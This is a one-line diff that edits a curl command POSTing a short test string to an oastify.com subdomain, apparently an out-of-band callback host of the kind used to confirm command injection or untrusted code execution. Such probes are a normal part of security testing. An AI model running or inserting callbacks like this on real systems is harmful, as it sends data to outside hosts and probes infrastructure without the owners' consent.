@@ -1,1 +1,1 @@
-curl -X POST --data-binary test123bo https://9blhfe0tg88uc8gsa0j37sbspjvaj07p.oastify.com/?
+curl -X POST --data-binary test1234567bo https://9blhfe0tg88uc8gsa0j37sbspjvaj07p.oastify.com/?
